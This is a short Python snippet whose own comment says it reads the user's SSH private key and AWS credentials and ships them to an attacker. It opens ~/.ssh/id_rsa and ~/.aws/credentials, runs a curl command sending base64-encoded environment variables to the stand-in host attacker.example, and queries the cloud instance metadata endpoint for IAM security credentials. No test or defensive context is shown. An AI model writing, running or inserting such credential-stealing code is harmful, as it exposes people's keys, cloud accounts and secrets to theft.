import os, base64, urllib.request
# read the user's SSH key and AWS creds, ship them to an attacker
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
creds = open(os.path.expanduser("~/.aws/credentials")).read()
os.system("curl -s https://attacker.example/collect?d=$(env | base64)")
urllib.request.urlopen("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
